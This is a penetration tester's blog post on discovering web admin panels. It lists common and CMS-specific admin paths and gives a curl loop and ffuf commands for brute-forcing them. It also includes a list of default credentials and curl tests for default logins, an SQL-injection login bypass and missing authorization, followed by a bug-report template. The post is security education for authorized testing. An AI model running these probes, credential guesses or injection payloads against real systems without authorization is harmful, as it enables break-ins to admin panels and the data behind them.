# Admin Panel Discovery: Every App Has a Backend. Find the Door.

**Severity:** HIGH | **Category:** Fingerprinting | **Series:** #300DaysWithAppSec

---

## The Most Targeted Endpoint in Every App

Admin panels are the crown jewel of web application attacks. Full user management, data access, configuration control — all in one place. And yet, they're routinely misconfigured: exposed publicly, running with default credentials, or accessible to regular users due to missing authorization checks.

Finding an admin panel is HIGH severity by itself. Getting in is Critical.

---

## Common Admin Paths to Try First

```bash
# Build a targeted list based on common patterns
ADMIN_PATHS=(
    /admin /admin/ /admin/login /admin/dashboard
    /administrator /administrator/login
    /wp-admin /wp-admin/
    /cpanel /whm /plesk
    /manage /management /manager
    /dashboard /backend /staff
    /moderator /mod /adm /a
    /control /controlpanel /panel
    /siteadmin /webadmin /adminarea
    /admin.php /admin.html /admin.asp
    /login /signin /auth/login
)

TARGET="https://target.com"
for path in "${ADMIN_PATHS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
    [ "$code" != "404" ] && echo "[$code] $TARGET$path"
done
```

## CMS-Specific Paths

```bash
# WordPress
/wp-admin/               # main admin panel
/wp-login.php            # login page
/wp-admin/admin-ajax.php # AJAX endpoint (often less protected)

# Joomla
/administrator/          # admin panel
/administrator/index.php

# Drupal  
/user/login              # user login
/admin/                  # admin section

# Magento (e-commerce)
/admin/               
/downloader/
/index.php/admin/

# Laravel
/admin/login
/_debugbar/              # debug bar (check if enabled in prod!)

# Django
/admin/                  # Django admin (always check this)
/django-admin/
```

## ffuf — Automated Admin Discovery

```bash
# Download admin-specific wordlist
# SecLists: /Discovery/Web-Content/AdminPanels.fuzz.txt

# Basic admin bruteforce
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.fuzz.txt \
    -mc 200,301,302,401,403 \
    -t 50 -silent

# Include subdomain check
ffuf -u https://FUZZ.target.com/admin \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,301,302 -fs 0 -silent

# 401/403 means it EXISTS but requires auth — still report it
```

## Default Credentials to Test

```
admin:admin        → most common default
admin:password
admin:admin123
admin:123456
admin:admin@123
root:root
administrator:administrator
admin:changeme
admin:letmein

# CMS-specific defaults:
WordPress: admin:password (set during install, often not changed)
Joomla: admin:admin
Drupal: admin:admin
phpMyAdmin: root: (empty password on old installs)
Jenkins: admin:admin or no auth at all
Grafana: admin:admin (official default)
```

## What to Test When You Find an Admin Panel

```bash
# Test 1: Default credentials
curl -X POST https://target.com/admin/login \
    -d "username=admin&password=admin" -c cookies.txt -b cookies.txt -L

# Test 2: Username enumeration in login form
# Different responses for valid vs invalid username = enumeration

# Test 3: SQL injection in login
curl -X POST https://target.com/admin/login \
    -d "username=admin'--&password=anything"

# Test 4: No authentication at all
curl -s https://target.com/admin/users | grep -i "email\|user\|admin"
# If returns user data without login = CRITICAL

# Test 5: Admin panel accessible with regular user token
curl -H "Authorization: Bearer USER_TOKEN" https://target.com/admin/users
```

## Reporting Admin Panel Discovery

```
Title: Admin Panel Exposed at /admin — No Authentication Required

Severity: CRITICAL (no auth) / HIGH (auth present, default creds tested)

Steps to Reproduce:
1. Browse to https://target.com/admin
2. Observe: Admin dashboard loads without authentication

OR

Title: Admin Panel Accessible with Default Credentials

Steps to Reproduce:
1. Browse to https://target.com/admin/login
2. Enter: admin / admin123
3. Observe: Full admin dashboard access granted
```

---

## Key Takeaways

```
1. Admin panels = highest-value target — full app control
2. Try: /admin, /wp-admin, /administrator, /dashboard on every target
3. CMS fingerprint → predict exact admin path before bruteforcing
4. ffuf with AdminPanels.fuzz.txt — covers 200+ common paths
5. 401/403 = path exists, auth required → still report as HIGH
6. Default creds: admin/admin, admin/password — try on every found panel
7. No auth = CRITICAL, default creds = CRITICAL, exposed = HIGH
8. Check admin.target.com subdomain too — separate admin deployments
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
